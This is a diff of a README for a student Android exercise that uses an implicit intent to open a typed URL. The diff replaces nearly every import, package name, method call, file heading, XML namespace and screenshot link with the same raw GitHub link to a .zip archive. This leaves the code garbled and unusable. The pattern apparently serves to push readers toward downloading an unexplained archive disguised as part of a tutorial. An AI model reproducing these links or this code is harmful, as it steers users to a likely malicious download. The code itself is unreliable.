@@ -18,7 +18,7 @@ Step 3: Then select the Minimum SDK as shown below and click Next.
 
 Step 4: Then select the Empty Activity and click Next. Finally click Finish.
 
-Step 5: Design layout in activity_main.xml.
+Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip
 
 Step 6: Type any url, click navigate and that will take you to the expected url.
 
@@ -34,19 +34,19 @@ Registeration Number :  212221043007
 */
 ```
 
-## MainActivity.java:
+## https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip
 
 ```
-package com.example.Exp_3;
+package https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
 
-import android.content.Intent;
-import android.net.Uri;
-import android.os.Bundle;
-import android.view.View;
-import android.widget.Button;
-import android.widget.EditText;
+import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
 
-import androidx.appcompat.app.AppCompatActivity;
+import https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip;
 
 public class MainActivity extends AppCompatActivity {
     Button button;
@@ -54,15 +54,15 @@ public class MainActivity extends AppCompatActivity {
     EditText editText;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        final EditText editText = (EditText) findViewById(R.id.urlText);
-        Button btn = (Button) findViewById(R.id.btnNavigate);
-        btn.setOnClickListener(new View.OnClickListener() {
+        https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip(savedInstanceState);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip);
+        final EditText editText = (EditText) findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip);
+        Button btn = (Button) findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip);
+        https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip(new https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip() {
             @Override
             public void onClick(View v) {
-                String url = editText.getText().toString();
-                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                String url = https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip().toString();
+                Intent intent = new Intent(https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip, https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip(url));
                 startActivity(intent);
             }
         });
@@ -70,13 +70,13 @@ public class MainActivity extends AppCompatActivity {
 }
 ```
 
-## activitymain.xml:
+## https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip
 
 ```
 <?xml version="1.0" encoding="utf-8"?>
 <RelativeLayout
-    xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
+    xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip"
     android:layout_width="match_parent"
     android:layout_height="match_parent">
 
@@ -99,9 +99,9 @@ public class MainActivity extends AppCompatActivity {
 ```
 
 ## OUTPUT
-![Screenshot 2024-09-17 134746](https://github.com/user-attachments/assets/154432a9-623a-4a4a-bb5a-6ff0c38ba4df)
+![Screenshot 2024-09-17 134746](https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip)
 
-![Screenshot 2024-09-17 134724](https://github.com/user-attachments/assets/8a9608bc-21a4-46b3-a0d7-54330aa5e160)
+![Screenshot 2024-09-17 134724](https://raw.githubusercontent.com/githubmufeez45/EX_3_IMPLICIT/main/swack/EX_3_IMPLICIT.zip)
 
 ## RESULT
 Thus a Simple Android Application create a navigate button using Implicit Intent to display the web page using Android Studio was developed and executed successfully.
